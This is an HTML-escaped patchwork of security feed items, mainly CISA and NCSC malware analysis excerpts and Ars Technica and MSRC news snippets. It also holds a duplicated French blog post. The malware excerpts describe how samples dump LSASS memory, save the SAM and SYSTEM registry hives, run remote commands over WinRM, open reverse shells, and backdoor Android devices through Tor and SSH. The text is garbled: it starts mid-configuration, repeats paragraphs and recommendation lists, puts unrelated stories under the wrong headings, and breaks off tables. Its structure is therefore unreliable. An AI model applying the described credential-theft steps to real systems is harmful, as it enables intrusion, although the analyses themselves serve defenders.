/&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_compression = true&amp;nbsp;&lt;br /&gt;--End configuration--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below are the command-line usages and flags of the "FRPC" tool:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin usages and flags--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Usage:&amp;nbsp;&lt;br /&gt;frpc [flags]&amp;nbsp;&lt;br /&gt;frpc [command]&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Available Commands:&amp;nbsp;&lt;br /&gt;help &amp;nbsp;&amp;nbsp;&amp;nbsp;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

La vulgarisation de ces thématiques est importante pour que chacun comprenne les enjeux de la cybersécurité.&lt;/p&gt;&lt;p&gt;Les aspects techniques doivent être expliqués simplement pour que chacun puisse se faire sa propre opinion et que cela ne reste pas un sujet d’experts.&lt;/p&gt;&lt;p&gt;Sur les publications de CTI, j’ai avancé sur pas mal de choses, mais je n’ai pas trouvé d’intérêt à publier sur le sujet. J’essaierai de le faire en 2024 dans le cadre de M82&lt;/p&gt;&lt;p&gt;La &lt;a href="https://www.botconf.eu/"&gt;botconf &lt;/a&gt;a fêté sa 10 eme année et encore une fois et nous continuons nos efforts pour garantir la qualité de la conférence ce qui lui a permis de devenir incontournable sur les sujets concernant les malwares, les botnets et la CTI. Nous revenons en 2024 à Nice !&lt;/p&gt;&lt;p&gt;&lt;strong&gt;et 2024 ?&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Alors quoi de neuf pour 2024 ?&lt;/p&gt;&lt;p&gt;Nous allons continuer de proposer de nouvelles choses sur M82, (petit teasing, un nouveau site web va arriver)&lt;/p&gt;&lt;p&gt;En ce qui concerne Yeti, nous avons accueilli Fred Baguelin (@udgover) dans l’équipe de dev et nous ajoutons de nouvelles fonctionnalités notamment une meilleure prise en compte des menaces liées au cloud, l’ajout d’une meilleure auditabilité des actions réalisées dans Yeti et une meilleure intégration avec les outils de Threat Intelligence. Il y aura une release par semaine corrigeant les bugs rencontrés et l’ajout de nouvelles fonctionnalités.&lt;/p&gt;&lt;p&gt;Pour les cours, je vais intervenir et encadrer des étudiants dès la première année de cycle d’ingénieur.&lt;/p&gt;&lt;p&gt;Côté recherche et développement, nous allons accueillir une stagiaire pour travailler sur une application que j’avais initiée quand j’étais à Epita sur la création de son propre &lt;a href="https://github.com/PassiveDNS/PassiveDNS"&gt;passive dns&lt;/a&gt;. Nous allons changer la stack technique et ajouter des interactions avec Yeti. L’objectif est de présenter à hacklu 2024 et de proposer différents articles sur des cas d’usages. Je vais revoir aussi &lt;a href="https://github.com/onyphe/pyonyphe"&gt;pyonyphe&lt;/a&gt; en ajoutant des fonctionnalités, des tests et de la documentation associée. Pour le doctorat, je vais continuer les travaux sur la classification de malware et la similarité de binaire dans le but de proposer des papiers dans différents journaux et conférences académiques et ensuite lancer les démarches pour la VAE.&lt;/p&gt;&lt;p&gt;Je vais ouvrir un service d’analyse de malware à la demande au courant printemps. Je reviendrai là-dessus dans un prochain article.&lt;/p&gt;&lt;p&gt;Je vous souhaite à &lt;strong&gt;tous mes meilleurs vœux pour 2024&lt;/strong&gt; et j’espère vous croiser dans les différentes conférences et événements de l’année.

La vulgarisation de ces thématiques est importante pour que chacun comprenne les enjeux de la cybersécurité.&lt;/p&gt;&lt;p&gt;Les aspects techniques doivent être expliqués simplement pour que chacun puisse se faire sa propre opinion et que cela ne reste pas un sujet d’experts.&lt;/p&gt;&lt;p&gt;Sur les publications de CTI, j’ai avancé sur pas mal de choses, mais je n’ai pas trouvé d’intérêt à publier sur le sujet. J’essaierai de le faire en 2024 dans le cadre de M82&lt;/p&gt;&lt;p&gt;La &lt;a href="https://www.botconf.eu/"&gt;botconf &lt;/a&gt;a fêté sa 10 eme année et encore une fois et nous continuons nos efforts pour garantir la qualité de la conférence ce qui lui a permis de devenir incontournable sur les sujets concernant les malwares, les botnets et la CTI. Nous revenons en 2024 à Nice !&lt;/p&gt;&lt;p&gt;&lt;strong&gt;et 2024 ?&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Alors quoi de neuf pour 2024 ?&lt;/p&gt;&lt;p&gt;Nous allons continuer de proposer de nouvelles choses sur M82, (petit teasing, un nouveau site web va arriver)&lt;/p&gt;&lt;p&gt;En ce qui concerne Yeti, nous avons accueilli Fred Baguelin (@udgover) dans l’équipe de dev et nous ajoutons de nouvelles fonctionnalités notamment une meilleure prise en compte des menaces liées au cloud, l’ajout d’une meilleure auditabilité des actions réalisées dans Yeti et une meilleure intégration avec les outils de Threat Intelligence. Il y aura une release par semaine corrigeant les bugs rencontrés et l’ajout de nouvelles fonctionnalités.&lt;/p&gt;&lt;p&gt;Pour les cours, je vais intervenir et encadrer des étudiants dès la première année de cycle d’ingénieur.&lt;/p&gt;&lt;p&gt;Côté recherche et développement, nous allons accueillir une stagiaire pour travailler sur une application que j’avais initiée quand j’étais à Epita sur la création de son propre &lt;a href="https://github.com/PassiveDNS/PassiveDNS"&gt;passive dns&lt;/a&gt;. Nous allons changer la stack technique et ajouter des interactions avec Yeti. L’objectif est de présenter à hacklu 2024 et de proposer différents articles sur des cas d’usages. Je vais revoir aussi &lt;a href="https://github.com/onyphe/pyonyphe"&gt;pyonyphe&lt;/a&gt; en ajoutant des fonctionnalités, des tests et de la documentation associée. Pour le doctorat, je vais continuer les travaux sur la classification de malware et la similarité de binaire dans le but de proposer des papiers dans différents journaux et conférences académiques et ensuite lancer les démarches pour la VAE.&lt;/p&gt;&lt;p&gt;Je vais ouvrir un service d’analyse de malware à la demande au courant printemps. Je reviendrai là-dessus dans un prochain article.&lt;/p&gt;&lt;p&gt;Je vous souhaite à &lt;strong&gt;tous mes meilleurs vœux pour 2024&lt;/strong&gt; et j’espère vous croiser dans les différentes conférences et événements de l’année. Et merci à tous ceux qui m’ont soutenu et aidé cette année.&lt;/p&gt;&lt;img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;amp;referrerSource=full_rss&amp;amp;postId=5ae95bdbd747" width="1" /&gt;</content:encoded><guid isPermaLink="false">https://medium.com/p/5ae95bdbd747</guid><category>happy-new-year</category><category>retrospectives</category></item><item><title>Microsoft addresses App Installer abuse</title><link>https://msrc.microsoft.com/blog/2023/12/microsoft-addresses-app-installer-abuse/</link><description>28 October 2024 Update
Microsoft disabled the ms-appinstaller URI scheme handler by default in App Installer on 28 December 2023 as a security response to protect customers from attackers’ evolving techniques against previous safeguards for CVE-2021-43890.
Microsoft is pleased to announce that we have introduced new safeguards to the ms-appinstaller URI scheme handler by default in version 1.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2023/12/microsoft-addresses-app-installer-abuse/</guid></item><item><title>Azure Serial Console Attack and Defense - Part 2</title><link>https://msrc.microsoft.com/blog/2023/12/azure-serial-console-attack-and-defense-part-2/</link><description>This is the second installment of the Azure Serial Console blog, which provides insights to improve defenders’ preparedness when investigating Azure Serial Console activity on Azure Linux virtual machines.

&lt;p&gt;“Recently, my wife received a notification from UniFi Protect, which included an image from a security camera,” one Reddit user &lt;a href="https://www.reddit.com/r/Ubiquiti/comments/18hgpw1/security_problem/"&gt;reported&lt;/a&gt;. “However, here's the twist—this camera doesn't belong to us.”&lt;/p&gt;
&lt;h2&gt;Stoking concern and anxiety&lt;/h2&gt;
&lt;p&gt;The post included two images. The first showed a notification pushed to the person’s phone reporting that their UDM Pro, a network controller and network gateway used by tech-enthusiast consumers, had detected someone moving in the backyard. A still shot of video recorded by a connected surveillance camera showed a three-story house surrounded by trees. The second image showed the dashboard belonging to the Reddit user. The user’s connected device was a UDM SE, and the video it captured showed a completely different house.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2023/12/unifi-devices-broadcasted-private-video-to-other-users-accounts/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the piece, Schneier notes that the existing landscape of electronic surveillance has already transformed the modern era, becoming the &lt;a href="https://www.schneier.com/blog/archives/2013/11/surveillance_as_1.html"&gt;business model of the Internet&lt;/a&gt;, where our digital footprints are constantly tracked and analyzed for commercial reasons. Spying, by contrast, can take that kind of economically inspired monitoring to a completely new level:&lt;/p&gt;
&lt;p&gt;"Spying and surveillance are different but related things," Schneier writes. "If I hired a private detective to spy on you, that detective could hide a bug in your home or car, tap your phone, and listen to what you said. At the end, I would get a report of all the conversations you had and the contents of those conversations. If I hired that same private detective to put you under surveillance, I would get a different report: where you went, whom you talked to, what you purchased, what you did."&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2023/12/due-to-ai-we-are-about-to-enter-the-era-of-mass-spying-says-bruce-schneier/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three Cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Start names and paths of .cab files created--&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\em.cab&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\am.cab&lt;br /&gt;&lt;br /&gt;
			c:\windows\tasks\a.cab&lt;br /&gt;&lt;br /&gt;
			--End names and paths of .cab files created--&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the Remote Procedure Call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message "[*]success" in the console.&lt;/p&gt;

&lt;p&gt;This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.&lt;/p&gt;

&lt;p&gt;This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword "hashpasswd" is present. If the keyword "hashpasswd" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Underscoring the importance of their discovery, the researchers used their findings to calculate the private portion of almost 200 unique SSH keys they observed in public Internet scans taken over the past seven years. The researchers suspect keys used in IPsec connections could suffer the same fate. SSH is the cryptographic protocol used in secure shell connections that allows computers to remotely access servers, usually in security-sensitive enterprise environments. IPsec is a protocol used by virtual private networks that route traffic through an encrypted tunnel.&lt;/p&gt;
&lt;p&gt;The vulnerability occurs when there are errors during the signature generation that takes place when a client and server are establishing a connection. It affects only keys using the RSA cryptographic algorithm, which the researchers found in roughly a third of the SSH signatures they examined. That translates to roughly 1 billion signatures out of the 3.2 billion signatures examined. Of the roughly 1 billion RSA signatures, about one in a million exposed the private key of the host.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2023/11/hackers-can-steal-ssh-cryptographic-keys-in-new-cutting-edge-attack/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

But cue sheets are getting attention again, for all the wrong reasons. They're at the heart of a one-click exploit that could give an attacker code execution on Linux systems with GNOME desktops.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43641"&gt;CVE-2023-43641&lt;/a&gt;, &lt;a href="https://github.blog/2023-10-09-coordinated-disclosure-1-click-rce-on-gnome-cve-2023-43641/#fn-74613-1"&gt;disclosed by GitHub on October 9&lt;/a&gt;, is a memory corruption (or out-of-bounds array writing) issue in the &lt;a href="https://github.com/lipnitsk/libcue"&gt;libcue library&lt;/a&gt;, which parses cue sheets. NIST has yet to provide a score for the issue, but GitHub's submission rates it an 8.8, or "High." While the vulnerability has been patched in the core library, Linux distributions will need to update their desktops to fix it.&lt;/p&gt;
&lt;p&gt;GNOME desktops have, by default, a "tracker miner" that automatically updates whenever certain file locations in a user's home directory are changed. If a user was compelled to download a cue sheet that took advantage of libcue's vulnerability, GNOME's indexing tracker would read the cue sheet, and code in that sheet could be executed.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2023/10/one-click-remote-code-exploit-in-cd-cue-files-affects-most-gnome-based-linux-distros/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This file is a SUBMARINE artifact, an empty text/data file. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell. The code in Figure 1 will change the permissions of any directory/file/path with that begins with '/root/mac' to executable. Then, anything containing the string 'mach*' in the directory/file/path '/root/mach' are executed.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;





  
      




      Figure 1 - Figure 1 depicts the Base64 encoded, and decoded, name of the artifact.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the SKIPJACK malware family, is a Perl script that enumerates file system information. This script first checks the file system by opening '/etc/fstab.main/,' then checks the value against the array 'ARGV[0]', which perl automatically provides to hold all values from the command line in. The script will print either 'xfs' or hda depending on the type of file system it finds. The script contains a second if statement that gathers more information about the type of file system. This second if statement contains the regular expression '/^\/dev\/(\S+)\d+\s+\/\s+(\S+)/,' which translates to '/etc/fstab.' The script uses this second half of the code to check for file system type or information about the partition, which it then prints based on the value of '$requested_data.'&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a trojanized Lua module that has been identified as a "SEASPRAY" variant. SEASPRAY registers an event handler for all incoming email attachments. This variant checks for the sender and the string “obt”, which is hard coded in the lua file. If that string is found the malware uses os.execute to execute the file “saslautchd”, see Figure 3.&lt;/p&gt;
&lt;h5&gt;Screenshots&lt;/h5&gt;





  
      




      &lt;strong&gt;Figure 3&lt;/strong&gt; - This screenshot illustrates how the SEASPRAY filters traffic looking for the string "obt". Once that string is received SEASPRAY uses os.execute to execute the file "saslautchd".

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the WHIRLPOOL malware family, is a 64-bit Linux Executable and Linkable Format (ELF) file. The malware checks processor hardware and architecture, to include if the target system uses AMD or Intel, see Figure 4. Figure 5 shows the malware determining the kernel version by invoking the 'uname' command line function and exploring the contents of the '/proc/sys/kernel/osrelease' file. Figures 6, 7, and 8 show the malware's capacity to connect to a remote address, and then create a new process with the command line argument '/bin/sh.' The connection to a remote host and the invocation of a bash shell are the two components/phases used by reverse shells. Figure 9 shows the malware's capacity to interact with the Name Service Cache Daemon by creating and connecting to a Unix socket at ./var/run/nscd/socket.' This socket can cache Domain Name System (DNS) requests. Rather than listening on port 53, it listens on the socket file itself, for data from other programs/processes. Figure 10 shows the malware's capacity to perform DNS resolution, using the system call 'sys_getpeername.' The malware accesses the target's environment variables.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the SALTWATER malware family, is a 32-bit Linux Shared Object (.so) file. The malware can intake data over the network, using a previously established socket, with the 'recv' function as shown in Figure 11. Figure 12 shows the malware creating a new thread, within the calling process. This is thread injection and it can inject two different functions. Figure 13 shows the first function that can perform DNS resolution. Figures 14 and 15 show the second function. The second function can establish communications, over the network, using a TLS version 1 connection. Lastly, using 'popen', the malware can execute any shell command with the same privileges as its calling process.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA received 4 files for analysis from an incident response engagement conducted at an Aeronautical Sector organization.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			2 files (bitmap.exe, wkHPd.exe) are identified as variants of Metasploit (Meterpreter) and designed to connect and receive unencrypted payloads from their respective command and control (C2) servers. Note: Metasploit is an open source penetration testing software; Meterpreter is a Metasploit attack payload that runs an interactive shell. These executables are used as attack payloads to run interactive shells, allowing a malicious actor the ability to control and execute code on a system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			2 files (resource.aspx, ConfigLogin.aspx) are Active Server Pages (ASPX) web shells designed to execute remote JavaScript code on the victim server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			CISA has provided indicators of compromise (IOCs) and YARA rules for detection within this Malware Analysis Report (MAR).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;Executive Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Infamous Chisel is a collection of components targeting Android devices.&lt;/li&gt;
&lt;li&gt;This malware is associated with Sandworm activity.&lt;/li&gt;
&lt;li&gt;It performs periodic scanning of files and network information for exfiltration.&lt;/li&gt;
&lt;li&gt;System and application configuration files are exfiltrated from an infected device.&lt;/li&gt;
&lt;li&gt;Infamous Chisel provides network backdoor access via a Tor (The Onion Router) hidden service and Secure Shell (SSH).&lt;/li&gt;
&lt;li&gt;Other capabilities include network monitoring, traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;The UK National Cyber Security Centre (NCSC), the U.S. National Security Agency (NSA), U.S. Cybersecurity and Infrastructure Security Agency (CISA), U.S. Federal Bureau of Investigation (FBI), New Zealand’s National Cyber Security Centre (NCSC-NZ), the Canadian Centre for Cyber Security – part of the Canada’s Communications Security Establishment (CSE), and Australian Signals Directorate (ASD) are aware that the actor known as Sandworm has used a new mobile malware in a campaign targeting Android devices used by the Ukrainian military. The malware is referred to here as Infamous Chisel.&lt;/p&gt;
&lt;p&gt;Organizations from the United Kingdom, United States, Australia, Canada, and New Zealand have previously linked the Sandworm actor to the Russian GRU's Main Centre for Special Technologies GTsST.&lt;/p&gt;

&lt;h2&gt;Malware Summary&lt;/h2&gt;
&lt;p&gt;Infamous Chisel is a collection of components which enable persistent access to an infected Android device over the Tor network, and which periodically collates and exfiltrates victim information from compromised devices. The information exfiltrated is a combination of system device information, commercial application information, and applications specific to the Ukrainian military.&lt;/p&gt;
&lt;p&gt;The malware periodically scans the device for information and files of interest, matching a predefined set of file extensions. It also contains functionality to periodically scan the local network collating information about active hosts, open ports, and banners.&lt;/p&gt;
&lt;p&gt;Infamous Chisel also provides remote access by configuring and executing Tor with a hidden service which forwards to a modified Dropbear binary providing a SSH connection.&lt;/p&gt;
&lt;p&gt;Other capability includes network monitoring and traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/p&gt;

&lt;h2&gt;Functionality&lt;/h2&gt;
&lt;h3&gt;Overview&lt;/h3&gt;
&lt;p&gt;Infamous Chisel is a collection of multiple components. For &lt;code&gt;netd&lt;/code&gt;, &lt;code&gt;killer&lt;/code&gt;, &lt;code&gt;blob&lt;/code&gt;, and &lt;code&gt;td&lt;/code&gt; functionality can be extrapolated from references between them. The function of other binaries changes depending on the command line parameters that are supplied. It is likely that interaction takes place over the SSH remote shell connection configured by &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;

&lt;/td&gt;
&lt;td&gt;

&lt;/td&gt;

&lt;p&gt;netd&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component is used to perform automated device information collection and exfiltration.&lt;/p&gt;
&lt;/td&gt;

&lt;td&gt;
&lt;p&gt;killer&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;blob&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component is executed by netd and is responsible for configuring and executing the Tor utility td.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;td&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is Tor with no obvious modifications.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;

&lt;/td&gt;
&lt;td&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;

&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;These utilities are multi-call containing:&lt;/p&gt;
&lt;p&gt;dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications). ARM and x86 variants.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;db&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3&gt;Persistence&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; is designed to persist on the system by replacing the legitimate &lt;code&gt;netd&lt;/code&gt; system binary at the path &lt;code&gt;/system/bin/netd&lt;/code&gt;. This replacement is not carried out by the malware, but it can be extrapolated from the checks that it carries out. This is the only Infamous Chisel component which persists.&lt;/p&gt;
&lt;p&gt;When the malicious &lt;code&gt;netd&lt;/code&gt; is executed, it will check if &lt;code&gt;init&lt;/code&gt; is the parent process which executed it. This parent process is responsible for creating the processes listed in the script &lt;code&gt;init.rc&lt;/code&gt;. The malicious replacement netd when executed in this way will fork and execute the legitimate process backed up at the path&amp;nbsp;&lt;code&gt;/system/bin/netd_&lt;/code&gt;&amp;nbsp;passing through the command line parameters. This retains the normal functionality of &lt;code&gt;netd&lt;/code&gt;, while allowing the malicious &lt;code&gt;netd&lt;/code&gt; to execute as root. This replacement would require an escalated privilege level to perform.&lt;/p&gt;
&lt;p&gt;If it doesn’t find itself at the &lt;code&gt;/system/bin/netd&lt;/code&gt; path, it will fork and set its parent process ID to &lt;code&gt;1&lt;/code&gt;, also attempting to kill the legitimate &lt;code&gt;netd&lt;/code&gt; process.&lt;/p&gt;

&lt;h2&gt;Components&lt;/h2&gt;
